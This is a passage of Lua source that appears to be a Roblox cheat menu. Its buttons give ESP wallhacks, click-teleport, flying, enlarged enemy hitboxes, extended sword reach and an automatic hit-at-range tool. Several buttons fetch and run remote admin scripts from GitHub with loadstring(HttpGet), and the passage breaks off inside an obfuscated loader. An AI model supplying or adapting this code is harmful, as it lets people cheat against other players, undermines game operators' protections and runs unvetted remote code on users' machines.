a.cmdxadmin.Text = "CMD X Admin"
a.cmdxadmin.TextColor3 = Color3.fromRGB(204, 204, 204)
a.cmdxadmin.TextScaled = true
a.cmdxadmin.TextSize = 14.000
a.cmdxadmin.TextWrapped = true
a.cmdxadmin.MouseButton1Down:connect(
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
    end
)
a.UICorner_87.CornerRadius = UDim.new(0, 4)
a.UICorner_87.Parent = a.cmdxadmin
a.ctrltp.Name = "ctrltp"
a.ctrltp.Parent = a.scriped_2
a.ctrltp.AnchorPoint = Vector2.new(0.5, 0)
a.ctrltp.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.ctrltp.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.ctrltp.BorderSizePixel = 2
a.ctrltp.Position = UDim2.new(0.5, 0, 0.324631959, 0)
a.ctrltp.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.ctrltp.ZIndex = 2
a.ctrltp.Font = Enum.Font.SourceSansBold
a.ctrltp.Text = "CTRL TP"
a.ctrltp.TextColor3 = Color3.fromRGB(204, 204, 204)
a.ctrltp.TextScaled = true
a.ctrltp.TextSize = 14.000
a.ctrltp.TextWrapped = true
a.ctrltp.MouseButton1Down:connect(
    function()
        local C = game.Players.LocalPlayer
        local d = C:GetMouse()
        local b = game:GetService("UserInputService")
        local D = false
        d.Button1Down:connect(
            function()
                if D then
                    C.Character:MoveTo(d.Hit.p)
                end
            end
        )
        b.InputBegan:connect(
            function(E, F)
                if E.UserInputType == Enum.UserInputType.Keyboard then
                    if E.KeyCode == Enum.KeyCode.LeftControl then
                        D = true
                    elseif E.KeyCode == Enum.KeyCode.RightControl then
                        D = true
                    end
                end
            end
        )
        b.InputEnded:connect(
            function(E, F)
                if E.UserInputType == Enum.UserInputType.Keyboard then
                    if E.KeyCode == Enum.KeyCode.LeftControl then
                        D = false
                    elseif E.KeyCode == Enum.KeyCode.RightControl then
                        D = false
                    end
                end
            end
        )
    end
)
a.UICorner_88.CornerRadius = UDim.new(0, 4)
a.UICorner_88.Parent = a.ctrltp
a.esp.Name = "esp"
a.esp.Parent = a.scriped_2
a.esp.AnchorPoint = Vector2.new(0.5, 0)
a.esp.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.esp.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.esp.BorderSizePixel = 2
a.esp.Position = UDim2.new(0.5, 0, 0.380738527, 0)
a.esp.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.esp.ZIndex = 2
a.esp.Font = Enum.Font.SourceSansBold
a.esp.Text = "Esp"
a.esp.TextColor3 = Color3.fromRGB(204, 204, 204)
a.esp.TextScaled = true
a.esp.TextSize = 14.000
a.esp.TextWrapped = true
a.esp.MouseButton1Down:connect(
    function()
        ALLYCOLOR = {0, 255, 255}
        ENEMYCOLOR = {255, 0, 0}
        TRANSPARENCY = 0.5
        HEALTHBAR_ACTIVATED = true
        function createFlex()
            players = game:GetService("Players")
            faces = {"Front", "Back", "Bottom", "Left", "Right", "Top"}
            currentPlayer = nil
            lplayer = players.LocalPlayer
            players.PlayerAdded:Connect(
                function(G)
                    currentPlayer = G
                    G.CharacterAdded:Connect(
                        function(H)
                            createESP(H)
                        end
                    )
                end
            )
            function checkPart(I)
                if (I:IsA("Part") or I:IsA("MeshPart")) and I.Name ~= "HumanoidRootPart" then
                    return true
                end
            end
            function actualESP(I)
                for u = 0, 5 do
                    surface = Instance.new("SurfaceGui", I)
                    surface.Face = Enum.NormalId[faces[u + 1]]
                    surface.AlwaysOnTop = true
                    frame = Instance.new("Frame", surface)
                    frame.Size = UDim2.new(1, 0, 1, 0)
                    frame.BorderSizePixel = 0
                    frame.BackgroundTransparency = TRANSPARENCY
                    if currentPlayer.Team == players.LocalPlayer.Team then
                        frame.BackgroundColor3 = Color3.new(ALLYCOLOR[1], ALLYCOLOR[2], ALLYCOLOR[3])
                    else
                        frame.BackgroundColor3 = Color3.new(ENEMYCOLOR[1], ENEMYCOLOR[2], ENEMYCOLOR[3])
                    end
                end
            end
            function createHealthbar(J)
                board = Instance.new("BillboardGui", J)
                board.Name = "total"
                board.Size = UDim2.new(1, 0, 1, 0)
                board.StudsOffset = Vector3.new(3, 1, 0)
                board.AlwaysOnTop = true
                bar = Instance.new("Frame", board)
                bar.BackgroundColor3 = Color3.new(255, 0, 0)
                bar.BorderSizePixel = 0
                bar.Size = UDim2.new(0.2, 0, 4, 0)
                bar.Name = "total2"
                health = Instance.new("Frame", bar)
                health.BackgroundColor3 = Color3.new(0, 255, 0)
                health.BorderSizePixel = 0
                health.Size = UDim2.new(1, 0, J.Parent.Humanoid.Health / 100, 0)
                J.Parent.Humanoid.Changed:Connect(
                    function(K)
                        J.total.total2.Frame.Size = UDim2.new(1, 0, J.Parent.Humanoid.Health / 100, 0)
                    end
                )
            end
            function createESP(c)
                bugfix = c:WaitForChild("Head")
                for u, v in pairs(c:GetChildren()) do
                    if checkPart(v) then
                        actualESP(v)
                    end
                end
                if HEALTHBAR_ACTIVATED then
                    createHealthbar(c:WaitForChild("HumanoidRootPart"))
                end
            end
            for u, L in pairs(players:GetChildren()) do
                if L ~= players.LocalPlayer then
                    currentPlayer = L
                    createESP(L.Character)
                    L.CharacterAdded:Connect(
                        function(H)
                            createESP(H)
                        end
                    )
                end
            end
        end
        createFlex()
    end
)
a.UICorner_89.CornerRadius = UDim.new(0, 4)
a.UICorner_89.Parent = a.esp
a.espores.Name = "espores"
a.espores.Parent = a.scriped_2
a.espores.AnchorPoint = Vector2.new(0.5, 0)
a.espores.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.espores.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.espores.BorderSizePixel = 2
a.espores.Position = UDim2.new(0.5, 0, 0.436845034, 0)
a.espores.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.espores.ZIndex = 2
a.espores.Font = Enum.Font.SourceSansBold
a.espores.Text = "Esp Ores"
a.espores.TextColor3 = Color3.fromRGB(204, 204, 204)
a.espores.TextScaled = true
a.espores.TextSize = 14.000
a.espores.TextWrapped = true
a.espores.MouseButton1Down:connect(
    function()
        function CreateESPPart(M, N)
            local O = M
            local P = Instance.new("BoxHandleAdornment")
            P.Size = M.Size + Vector3.new(0.1, 0.1, 0.1)
            P.Name = "EspPart"
            P.Adornee = O
            P.Color3 = N
            P.AlwaysOnTop = true
            P.ZIndex = 5
            P.Transparency = 0.2
            P.Parent = M
        end
        local t = workspace:getDescendants()
        for u = 1, #t do
            if t[u].Name == "Block" and t[u].Parent.Name == "Ores" then
                CreateESPPart(t[u], Color3.fromRGB(193, 223, 240))
            end
        end
    end
)
a.UICorner_90.CornerRadius = UDim.new(0, 4)
a.UICorner_90.Parent = a.espores
a.flyscript.Name = "flyscript"
a.flyscript.Parent = a.scriped_2
a.flyscript.AnchorPoint = Vector2.new(0.5, 0)
a.flyscript.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.flyscript.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.flyscript.BorderSizePixel = 2
a.flyscript.Position = UDim2.new(0.5, 0, 0.492951632, 0)
a.flyscript.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.flyscript.ZIndex = 2
a.flyscript.Font = Enum.Font.SourceSansBold
a.flyscript.Text = "Fly(E)"
a.flyscript.TextColor3 = Color3.fromRGB(204, 204, 204)
a.flyscript.TextScaled = true
a.flyscript.TextSize = 14.000
a.flyscript.TextWrapped = true
a.flyscript.MouseButton1Down:connect(
    function()
        repeat
            wait()
        until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and
            game.Players.LocalPlayer.Character:findFirstChild("Head") and
            game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
        local Q = game.Players.LocalPlayer:GetMouse()
        repeat
            wait()
        until Q
        local R = game.Players.LocalPlayer
        local S = R.Character.Head
        local T = false
        local U = true
        local V = {f = 0, b = 0, l = 0, r = 0}
        local W = {f = 0, b = 0, l = 0, r = 0}
        local X = 400
        local Y = 5000
        function Fly()
            local Z = Instance.new("BodyGyro", S)
            Z.P = 9e4
            Z.maxTorque = Vector3.new(9e9, 9e9, 9e9)
            Z.cframe = S.CFrame
            local _ = Instance.new("BodyVelocity", S)
            _.velocity = Vector3.new(0, 0.1, 0)
            _.maxForce = Vector3.new(9e9, 9e9, 9e9)
            repeat
                wait()
                R.Character.Humanoid.PlatformStand = true
                if V.l + V.r ~= 0 or V.f + V.b ~= 0 then
                    Y = Y + .5 + Y / X
                    if Y > X then
                        Y = X
                    end
                elseif not (V.l + V.r ~= 0 or V.f + V.b ~= 0) and Y ~= 0 then
                    Y = Y - 1
                    if Y < 0 then
                        Y = 0
                    end
                end
                if V.l + V.r ~= 0 or V.f + V.b ~= 0 then
                    _.velocity =
                        (game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (V.f + V.b) +
                        game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(V.l + V.r, (V.f + V.b) * .2, 0).p -
                        game.Workspace.CurrentCamera.CoordinateFrame.p) *
                        Y
                    W = {f = V.f, b = V.b, l = V.l, r = V.r}
                elseif V.l + V.r == 0 and V.f + V.b == 0 and Y ~= 0 then
                    _.velocity =
                        (game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (W.f + W.b) +
                        game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(W.l + W.r, (W.f + W.b) * .2, 0).p -
                        game.Workspace.CurrentCamera.CoordinateFrame.p) *
                        Y
                else
                    _.velocity = Vector3.new(0, 0.1, 0)
                end
                Z.cframe =
                    game.Workspace.CurrentCamera.CoordinateFrame *
                    CFrame.Angles(-math.rad((V.f + V.b) * 50 * Y / X), 0, 0)
            until not T
            V = {f = 0, b = 0, l = 0, r = 0}
            W = {f = 0, b = 0, l = 0, r = 0}
            Y = 0
            Z:Destroy()
            _:Destroy()
            R.Character.Humanoid.PlatformStand = false
        end
        Q.KeyDown:connect(
            function(a0)
                if a0:lower() == "e" then
                    if T then
                        T = false
                    else
                        T = true
                        Fly()
                    end
                elseif a0:lower() == "w" then
                    V.f = 1
                elseif a0:lower() == "s" then
                    V.b = -1
                elseif a0:lower() == "a" then
                    V.l = -1
                elseif a0:lower() == "d" then
                    V.r = 1
                end
            end
        )
        Q.KeyUp:connect(
            function(a0)
                if a0:lower() == "w" then
                    V.f = 0
                elseif a0:lower() == "s" then
                    V.b = 0
                elseif a0:lower() == "a" then
                    V.l = 0
                elseif a0:lower() == "d" then
                    V.r = 0
                end
            end
        )
        Fly()
    end
)
a.UICorner_91.CornerRadius = UDim.new(0, 4)
a.UICorner_91.Parent = a.flyscript
a.hitbox.Name = "hitbox"
a.hitbox.Parent = a.scriped_2
a.hitbox.AnchorPoint = Vector2.new(0.5, 0)
a.hitbox.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.hitbox.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.hitbox.BorderSizePixel = 2
a.hitbox.Position = UDim2.new(0.5, 0, 0.549058139, 0)
a.hitbox.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.hitbox.ZIndex = 2
a.hitbox.Font = Enum.Font.SourceSansBold
a.hitbox.Text = "Hitbox"
a.hitbox.TextColor3 = Color3.fromRGB(204, 204, 204)
a.hitbox.TextScaled = true
a.hitbox.TextSize = 14.000
a.hitbox.TextWrapped = true
a.hitbox.MouseButton1Down:connect(
    function()
        _G.HeadSize = 50
        _G.Disabled = true
        if _G.Disabled then
            for u, v in next, game:GetService("Players"):GetPlayers() do
                if v.Name ~= game:GetService("Players").LocalPlayer.Name then
                    pcall(
                        function()
                            v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
                            v.Character.HumanoidRootPart.Transparency = 0.8
                            v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Bright green")
                            v.Character.HumanoidRootPart.Material = "Neon"
                            v.Character.HumanoidRootPart.CanCollide = false
                        end
                    )
                end
            end
        end
    end
)
a.UICorner_92.CornerRadius = UDim.new(0, 4)
a.UICorner_92.Parent = a.hitbox
a.infiniteyield.Name = "infiniteyield"
a.infiniteyield.Parent = a.scriped_2
a.infiniteyield.AnchorPoint = Vector2.new(0.5, 0)
a.infiniteyield.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.infiniteyield.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.infiniteyield.BorderSizePixel = 2
a.infiniteyield.Position = UDim2.new(0.5, 0, 0.605164647, 0)
a.infiniteyield.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.infiniteyield.ZIndex = 2
a.infiniteyield.Font = Enum.Font.SourceSansBold
a.infiniteyield.Text = "Infinite Yield Admin"
a.infiniteyield.TextColor3 = Color3.fromRGB(204, 204, 204)
a.infiniteyield.TextScaled = true
a.infiniteyield.TextSize = 14.000
a.infiniteyield.TextWrapped = true
a.infiniteyield.MouseButton1Down:connect(
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    end
)
a.UICorner_93.CornerRadius = UDim.new(0, 4)
a.UICorner_93.Parent = a.infiniteyield
a.magicsword.Name = "magicsword"
a.magicsword.Parent = a.scriped_2
a.magicsword.AnchorPoint = Vector2.new(0.5, 0)
a.magicsword.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.magicsword.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.magicsword.BorderSizePixel = 2
a.magicsword.Position = UDim2.new(0.5, 0, 0.661271155, 0)
a.magicsword.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.magicsword.ZIndex = 2
a.magicsword.Font = Enum.Font.SourceSansBold
a.magicsword.Text = "Remove Sword Mesh"
a.magicsword.TextColor3 = Color3.fromRGB(204, 204, 204)
a.magicsword.TextScaled = true
a.magicsword.TextSize = 14.000
a.magicsword.TextWrapped = true
a.magicsword.MouseButton1Down:connect(
    function()
        for u, v in pairs(game:GetService "Players".LocalPlayer.Character:GetChildren()) do
            if v:isA("Tool") then
                v.Handle.Mesh:Destroy()
                lplayer.Character.Humanoid:UnequipTools()
            end
        end
    end
)
a.UICorner_94.CornerRadius = UDim.new(0, 4)
a.UICorner_94.Parent = a.magicsword
a.reach.Name = "reach"
a.reach.Parent = a.scriped_2
a.reach.AnchorPoint = Vector2.new(0.5, 0)
a.reach.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.reach.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.reach.BorderSizePixel = 2
a.reach.Position = UDim2.new(0.5, 0, 0.717377663, 0)
a.reach.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.reach.ZIndex = 2
a.reach.Font = Enum.Font.SourceSansBold
a.reach.Text = "Reach"
a.reach.TextColor3 = Color3.fromRGB(204, 204, 204)
a.reach.TextScaled = true
a.reach.TextSize = 14.000
a.reach.TextWrapped = true
a.reach.MouseButton1Down:connect(
    function()
        for u, v in pairs(game:GetService "Players".LocalPlayer.Character:GetChildren()) do
            if v:isA("Tool") then
                local a1 = Instance.new("SelectionBox", v.Handle)
                a1.Adornee = v.Handle
                v.Handle.Size = Vector3.new(0.5, 0.5, 60)
                v.GripPos = Vector3.new(0, 0, 0)
                lplayer.Character.Humanoid:UnequipTools()
            end
        end
    end
)
a.UICorner_95.CornerRadius = UDim.new(0, 4)
a.UICorner_95.Parent = a.reach
a.reachgui.Name = "reachgui"
a.reachgui.Parent = a.scriped_2
a.reachgui.AnchorPoint = Vector2.new(0.5, 0)
a.reachgui.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.reachgui.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.reachgui.BorderSizePixel = 2
a.reachgui.Position = UDim2.new(0.5, 0, 0.773484111, 0)
a.reachgui.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.reachgui.ZIndex = 2
a.reachgui.Font = Enum.Font.SourceSansBold
a.reachgui.Text = "Reach GUI"
a.reachgui.TextColor3 = Color3.fromRGB(204, 204, 204)
a.reachgui.TextScaled = true
a.reachgui.TextSize = 14.000
a.reachgui.TextWrapped = true
a.reachgui.MouseButton1Down:connect(
    function()
        local a2 = true
        local a3 = true
        local a4 = "Sphere"
        local a5 = true
        local a6 = false
        local a7 = Instance.new("Part")
        a7.BrickColor = BrickColor.Blue()
        a7.Transparency = 0.6
        a7.Anchored = true
        a7.CanCollide = false
        a7.Size = Vector3.new(0.5, 0.5, 0.5)
        a7.BottomSurface = Enum.SurfaceType.Smooth
        a7.TopSurface = Enum.SurfaceType.Smooth
        local a8 = Instance.new("ScreenGui")
        local a9 = Instance.new("Frame")
        local aa = Instance.new("TextLabel")
        local ab = Instance.new("TextBox")
        local ac = Instance.new("TextLabel")
        local ad = Instance.new("TextLabel")
        local ae = Instance.new("TextLabel")
        local af = Instance.new("TextButton")
        local ag = Instance.new("Frame")
        local ah = Instance.new("Frame")
        local ai = Instance.new("Frame")
        local aj = Instance.new("Frame")
        local ak = Instance.new("TextButton")
        a8.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        a8.DisplayOrder = 999999999
        a8.ResetOnSpawn = false
        a9.Parent = a8
        a9.AnchorPoint = Vector2.new(0, 0.5)
        a9.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
        a9.BackgroundTransparency = 0.300
        a9.BorderColor3 = Color3.fromRGB(0, 0, 0)
        a9.BorderSizePixel = 4
        a9.Position = UDim2.new(0, 0, 0.600000024, 0)
        a9.Size = UDim2.new(0.150000006, 0, 0.300000012, 0)
        aa.Parent = a9
        aa.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        aa.BackgroundTransparency = 1.000
        aa.Size = UDim2.new(0.600000024, 0, 0.200000003, 0)
        aa.Font = Enum.Font.SourceSans
        aa.Text = "Reach:"
        aa.TextColor3 = Color3.fromRGB(255, 255, 255)
        aa.TextScaled = true
        aa.TextSize = 14.000
        aa.TextWrapped = true
        ab.Parent = a9
        ab.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        ab.BackgroundTransparency = 1.000
        ab.Position = UDim2.new(0.600000024, 0, 0, 0)
        ab.Size = UDim2.new(0.400000006, 0, 0.200000003, 0)
        ab.Font = Enum.Font.SourceSans
        ab.Text = "3.5"
        ab.TextColor3 = Color3.fromRGB(255, 76, 76)
        ab.TextScaled = true
        ab.TextSize = 14.000
        ab.TextWrapped = true
        ac.Parent = a9
        ac.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        ac.BackgroundTransparency = 1.000
        ac.Position = UDim2.new(0, 0, 0.200000003, 0)
        ac.Size = UDim2.new(0.600000024, 0, 0.200000003, 0)
        ac.Font = Enum.Font.SourceSans
        ac.Text = "Shape:"
        ac.TextColor3 = Color3.fromRGB(255, 255, 255)
        ac.TextScaled = true
        ac.TextSize = 14.000
        ac.TextWrapped = true
        ad.Parent = a9
        ad.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        ad.BackgroundTransparency = 1.000
        ad.Position = UDim2.new(0, 0, 0.400000006, 0)
        ad.Size = UDim2.new(0.600000024, 0, 0.200000003, 0)
        ad.Font = Enum.Font.SourceSans
        ad.Text = "Damage:"
        ad.TextColor3 = Color3.fromRGB(255, 255, 255)
        ad.TextScaled = true
        ad.TextSize = 14.000
        ad.TextWrapped = true
        ae.Parent = a9
        ae.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        ae.BackgroundTransparency = 1.000
        ae.Position = UDim2.new(0, 0, 0.600000024, 0)
        ae.Size = UDim2.new(0.600000024, 0, 0.200000003, 0)
        ae.Font = Enum.Font.SourceSans
        ae.Text = "Visualizer:"
        ae.TextColor3 = Color3.fromRGB(255, 255, 255)
        ae.TextScaled = true
        ae.TextSize = 14.000
        ae.TextWrapped = true
        af.Parent = a9
        af.AnchorPoint = Vector2.new(0, 1)
        af.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        af.BackgroundTransparency = 1.000
        af.Position = UDim2.new(0, 0, 1, 0)
        af.Size = UDim2.new(1, 0, 0.150000006, 0)
        af.Font = Enum.Font.SourceSansBold
        af.Text = "Kill Script"
        af.TextColor3 = Color3.fromRGB(222, 0, 0)
        af.TextScaled = true
        af.TextSize = 14.000
        af.TextWrapped = true
        ag.Parent = a9
        ag.Active = true
        ag.AnchorPoint = Vector2.new(0, 0.5)
        ag.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
        ag.BorderSizePixel = 0
        ag.Position = UDim2.new(0.725000024, 0, 0.699999988, 0)
        ag.Size = UDim2.new(0, 25, 0, 25)
        ag.ZIndex = 5
        ah.Parent = ag
        ah.AnchorPoint = Vector2.new(0.5, 0.5)
        ah.BackgroundColor3 = Color3.fromRGB(255, 76, 76)
        ah.BorderSizePixel = 0
        ah.LayoutOrder = 1
        ah.Position = UDim2.new(0.5, 0, 0.5, 0)
        ai.Parent = a9
        ai.Active = true
        ai.AnchorPoint = Vector2.new(0, 0.5)
        ai.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
        ai.BorderSizePixel = 0
        ai.Position = UDim2.new(0.725000024, 0, 0.5, 0)
        ai.Size = UDim2.new(0, 25, 0, 25)
        ai.ZIndex = 5
        aj.Parent = ai
        aj.AnchorPoint = Vector2.new(0.5, 0.5)
        aj.BackgroundColor3 = Color3.fromRGB(255, 76, 76)
        aj.BorderSizePixel = 0
        aj.LayoutOrder = 1
        aj.Position = UDim2.new(0.5, 0, 0.5, 0)
        aj.Size = UDim2.new(1, 0, 1, 0)
        ak.Parent = a9
        ak.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        ak.BackgroundTransparency = 1.000
        ak.Position = UDim2.new(0.600000024, 0, 0.200000003, 0)
        ak.Size = UDim2.new(0.400000006, 0, 0.200000003, 0)
        ak.Font = Enum.Font.SourceSans
        ak.Text = "Sphere"
        ak.TextColor3 = Color3.fromRGB(255, 76, 76)
        ak.TextScaled = true
        ak.TextSize = 14.000
        ak.TextWrapped = true
        repeat
            wait()
        until game.Players.LocalPlayer
        a8.Parent = game:GetService("CoreGui")
        ai.InputBegan:connect(
            function(al)
                if al.UserInputType == Enum.UserInputType.MouseButton1 then
                    a5 = not a5
                    local am = {Size = UDim2.new(0, 0, 0, 0)}
                    if a5 then
                        am = {Size = UDim2.new(1, 0, 1, 0)}
                    end
                    game:GetService("TweenService"):Create(aj, TweenInfo.new(0.12, Enum.EasingStyle.Quad), am):Play()
                end
            end
        )
        ag.InputBegan:connect(
            function(al)
                if al.UserInputType == Enum.UserInputType.MouseButton1 then
                    a6 = not a6
                    local am = {Size = UDim2.new(0, 0, 0, 0)}
                    if a6 then
                        am = {Size = UDim2.new(1, 0, 1, 0)}
                    end
                    game:GetService("TweenService"):Create(ah, TweenInfo.new(0.12, Enum.EasingStyle.Linear), am):Play()
                end
            end
        )
        ak.MouseButton1Click:connect(
            function()
                if a4 == "Sphere" then
                    a4 = "Line"
                else
                    a4 = "Sphere"
                end
                ak.Text = a4
            end
        )
        af.MouseButton1Click:connect(
            function()
                a3 = false
                a8:Destroy()
            end
        )
        game:GetService("UserInputService").InputBegan:connect(
            function(al, an)
                if an then
                    return
                end
                if al.KeyCode == Enum.KeyCode.H then
                    a8.Enabled = not a8.Enabled
                end
            end
        )
        local R = game.Players.LocalPlayer
        local function ao(ap, aq)
            local ar = ap.Parent:FindFirstChildOfClass("Humanoid")
            if ar and ar.Parent.Name ~= game.Players.LocalPlayer.Name then
                if a5 then
                    for j, v in pairs(ap.Parent:GetChildren()) do
                        if v:IsA("Part") then
                            firetouchinterest(v, aq, 0)
                            firetouchinterest(v, aq, 1)
                        end
                    end
                else
                    firetouchinterest(ap, aq, 0)
                    firetouchinterest(ap, aq, 1)
                end
            end
        end
        local function as()
            local at = {}
            for j, v in pairs(game.Players:GetPlayers()) do
                if v ~= R then
                    local au = v.Character
                    if au then
                        for j, av in pairs(au:GetChildren()) do
                            if av:IsA("Part") then
                                table.insert(at, av)
                            end
                        end
                    end
                end
            end
            return at
        end
        game:GetService("RunService").RenderStepped:connect(
            function()
                if not a2 or not a3 then
                    return
                end
                local aw = R.Character and R.Character:FindFirstChildOfClass("Tool")
                if not aw then
                    a7.Parent = nil
                end
                if aw then
                    local aq = aw:FindFirstChild("Handle") or aw:FindFirstChildOfClass("Part")
                    if aq then
                        if a6 then
                            a7.Parent = workspace
                        else
                            a7.Parent = nil
                        end
                        local ax = tonumber(ab.Text)
                        if ax then
                            if a4 == "Sphere" then
                                a7.Shape = Enum.PartType.Ball
                                a7.Size = Vector3.new(ax, ax, ax)
                                a7.CFrame = aq.CFrame
                                for j, v in pairs(game.Players:GetPlayers()) do
                                    local J = v.Character and v.Character:FindFirstChild("HumanoidRootPart")
                                    if J and aq then
                                        local ay = (J.Position - aq.Position).magnitude
                                        if ay <= ax then
                                            ao(J, aq)
                                        end
                                    end
                                end
                            elseif a4 == "Line" then
                                local az = (aq.CFrame * CFrame.new(0, 0, -2)).p
                                local aA = Ray.new(az, aq.CFrame.lookVector * -ax)
                                local G, aB = workspace:FindPartOnRayWithWhitelist(aA, as())
                                a7.Shape = Enum.PartType.Block
                                a7.Size = Vector3.new(1, 0.8, ax)
                                a7.CFrame = aq.CFrame * CFrame.new(0, 0, ax / 2 + 2)
                                if G then
                                    ao(G, aq)
                                else
                                    for j, v in pairs(aq:GetTouchingParts()) do
                                        ao(v, aq)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        )
    end
)
a.UICorner_96.CornerRadius = UDim.new(0, 4)
a.UICorner_96.Parent = a.reachgui
a.revizadmin.Name = "revizadmin"
a.revizadmin.Parent = a.scriped_2
a.revizadmin.AnchorPoint = Vector2.new(0.5, 0)
a.revizadmin.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.revizadmin.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.revizadmin.BorderSizePixel = 2
a.revizadmin.Position = UDim2.new(0.5, 0, 0.829590619, 0)
a.revizadmin.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.revizadmin.ZIndex = 2
a.revizadmin.Font = Enum.Font.SourceSansBold
a.revizadmin.Text = "Reviz Admin"
a.revizadmin.TextColor3 = Color3.fromRGB(204, 204, 204)
a.revizadmin.TextScaled = true
a.revizadmin.TextSize = 14.000
a.revizadmin.TextWrapped = true
a.revizadmin.MouseButton1Down:connect(
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/qHXwvs48h3aan6/MyScripts/main/reviz"))()
    end
)
a.UICorner_97.CornerRadius = UDim.new(0, 4)
a.UICorner_97.Parent = a.revizadmin
a.shattervastadmin.Name = "shattervastadmin"
a.shattervastadmin.Parent = a.scriped_2
a.shattervastadmin.AnchorPoint = Vector2.new(0.5, 0)
a.shattervastadmin.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.shattervastadmin.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.shattervastadmin.BorderSizePixel = 2
a.shattervastadmin.Position = UDim2.new(0.5, 0, 0.885697186, 0)
a.shattervastadmin.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.shattervastadmin.ZIndex = 2
a.shattervastadmin.Font = Enum.Font.SourceSansBold
a.shattervastadmin.Text = "Shatter Vast Admin"
a.shattervastadmin.TextColor3 = Color3.fromRGB(204, 204, 204)
a.shattervastadmin.TextScaled = true
a.shattervastadmin.TextSize = 14.000
a.shattervastadmin.TextWrapped = true
a.shattervastadmin.MouseButton1Down:connect(
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/qHXwvs48h3aan6/MyScripts/main/shatterva"))()
    end
)
a.UICorner_98.CornerRadius = UDim.new(0, 4)
a.UICorner_98.Parent = a.shattervastadmin
a.skyfu.Name = "skyfu"
a.skyfu.Parent = a.scriped_2
a.skyfu.AnchorPoint = Vector2.new(0.5, 0)
a.skyfu.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.skyfu.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.skyfu.BorderSizePixel = 2
a.skyfu.Position = UDim2.new(0.5, 0, 0.941803753, 0)
a.skyfu.Size = UDim2.new(1, 0, -0.00717593404, 30)
a.skyfu.ZIndex = 2
a.skyfu.Font = Enum.Font.SourceSansBold
a.skyfu.Text = "Skyfu"
a.skyfu.TextColor3 = Color3.fromRGB(204, 204, 204)
a.skyfu.TextScaled = true
a.skyfu.TextSize = 14.000
a.skyfu.TextWrapped = true
a.skyfu.MouseButton1Down:connect(
    function()
        wait(1)
        local aC = select
        local aD = string.byte
        local aE = string.sub
        local aF = string.char
        local aG = type
        local aH = table.concat
        local unpack = unpack
        local setmetatable = setmetatable
        local pcall = pcall
        local aI, aJ, aK, aL
        if bit and bit.bxor then
            aI = bit.bxor
            aJ = function(aM, aN)
                local aO = aI(aM, aN)
                if aO < 0 then
                    aO = 4294967296 + aO
                end
                return aO
            end
        else
            aI = function(aM, aN)
                local aP = function(aQ, aR)
                    return aQ % (aR * 2) >= aR
                end
                local aS = 0
                for aT = 0, 31 do
                    aS = aS + (aP(aM, 2 ^ aT) ~= aP(aN, 2 ^ aT) and 2 ^ aT or 0)
                end
                return aS
            end
            aJ = aI
        end
        aK = function(aU, aV, aW)
            return (aU + aV) % aW
        end
        aL = function(aU, aV, aW)
            return (aU - aV) % aW
        end
        local function aX(aO)
            if aO < 0 then
                aO = 4294967296 + aO
            end
            return aO
        end
        local getfenv = getfenv
        if not getfenv then
            getfenv = function()
                return _ENV
            end
        end
        local aY = {}
        local aZ = {}
        local a_
        local b0
        local b1 = {}
        local b2 = {}
        for aT = 0, 255 do
            local b3, b4 = aF(aT), aF(aT, 0)
            b1[b3] = b4
            b2[b4] = b3
        end
        local function b5(b6, b7, b8, b9)
            if b8 >= 256 then
                b8, b9 = 0, b9 + 1
